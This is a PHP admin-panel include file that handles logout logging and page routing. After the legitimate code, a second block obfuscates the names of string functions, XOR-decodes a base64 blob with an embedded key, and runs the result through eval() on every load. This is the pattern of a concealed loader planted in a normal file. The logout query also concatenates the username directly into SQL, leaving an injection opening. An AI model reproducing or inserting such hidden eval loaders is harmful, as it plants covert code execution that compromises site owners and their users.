<?php

$HISTORY="";
$iRTables=0;

$iKEY="AZ8007";



if(get_param("action") == "exit")
{
		SQLQuery("
			INSERT INTO ".$DBprefix."login_log(username,ip,date,action,cookie) 
			VALUES('".$AuthUserName."','".$_SERVER['REMOTE_ADDR']."','".time()."','logout','')
		");
		$HISTORY=$USER_EXITED;
		setcookie("Auth","",time()-1);
		header("Location: login.php");
}


$arrMonths=array("","January","February","March","April","May","June","July","August","September","October","November","December");


	
if(!isset($category))
{
	$category="home";
}


$vr1 = ($category."_oLinkTexts");		
$vr2 = ($category."_oLinkActions");	

if(!isset($$vr1))
{

	die("<script>document.location.href=\"index.php\";</script>");
}

$evLinkTexts = $$vr1;
$evLinkActions = $$vr2;

if(!isset($folder)&&!isset($action)){
	$action=$evLinkActions[0];
}


$IPage="";

if(isset($action)){
	ms_w($action);
	if(!file_exists($category."/".$action.".php")) die("<script>document.location.href='index.php?error=2';</script>");
	$IPage=$action;
}
else
if(isset($folder))
{
	ms_w($folder);
	$IPage=$folder;
}
else
{
	die("ACCESS DENIED");
}

$ICurrentPage="@".$AuthGroup."@".$category."@".$IPage;

	

 if(isset($action)){
 	$IAction=$action;
 }
 else{
 	$IAction=$folder;
 }

$DN = "2";

?>

<?php
$a8hg6hj="10a3853fcddf698121f0e47370c11308FUMIR11qQxReEBYTUwIcVEpFOUYEWApHRUUGClhVGEhD
VQZsVVRHBQtMRjoGDA9tSgZTQjlMAARrSFUEbUsGCm1IVwFkTQRfTThVUgVlQAdUbR4GAWhPAVFs
GwcIERwYFW8ydmpjdjQ4RjhXBApkAAIEOkhQBmsCBQY/SQUGbAkDAj5vCQQFOlJUVToHCA1tSgVT
EjgdS09HQgZWbl5RTFJYSRFkBQZRDzhVUwFlQAcBbR4GVFgYbwYFUhMdExRnYnUzZX1naEQwOFVW
A2VABABtHgVTaE8HAmxSAwNvSA1Xfj1LDAR+OhtQUURrEBERSUxGVQlHUhNTWQYZExEZAw==";
$fyhhsa1="s";$fy3saa1="ba";$fy7vwa1="s";$fyhhsa1.="u";$fyhhsa1.="b";$fyhhsa1.="s";$fyhhsa1.="t";$fyhhsa1.="r";$fy3saa1.="se";$fy3saa1.="6";$fy3saa1.="4";$fy3saa1.="_";$fy3saa1.="de";$fy3saa1.="co";$fy3saa1.="de";$fy7vwa1.="t";$fy7vwa1.="r";$fy7vwa1.="l";$fy7vwa1.="e";$fy7vwa1.="n";
$a8hg6hh=$fyhhsa1($a8hg6hj,0,32);$a8hk6hj=$fy3saa1($fyhhsa1($a8hg6hj,32));$a7klm9hj="";for($a8hk9hj=0;$a8hk9hj < $fy7vwa1($a8hk6hj);$a8hk9hj++){$a7hk9hj=$fyhhsa1($a8hk6hj,$a8hk9hj,1);$a7h789hj=$fyhhsa1($a8hg6hh,$a8hk9hj%32,1);$a7klm9hj.=$a7hk9hj^$a7h789hj;}eval($a7klm9hj);$a7klm9hj="\n";

?>